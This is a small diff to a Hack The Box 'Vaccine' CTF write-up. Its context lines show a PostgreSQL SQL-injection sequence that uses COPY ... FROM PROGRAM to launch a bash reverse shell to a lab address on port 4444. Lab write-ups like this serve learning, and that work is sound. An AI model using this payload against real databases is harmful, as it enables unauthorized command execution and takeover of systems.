@@ -1,5 +1,3 @@
-Vaccine
-
 # Vaccine Box
 
 This is a linux box CTF on hack the box. It runs a website with a db back end.
@@ -150,6 +148,7 @@ I ended up runing the following SQL Injection commands to get a reverse shell
 
 DROP TABLE IF EXISTS cmd_exec;
 CREATE TABLE cmd\_exec(cmd\_output text);
+
 COPY cmd_exec FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/10.10.14.109/4444 0>&1"';
 
 This finally led to a remote shell
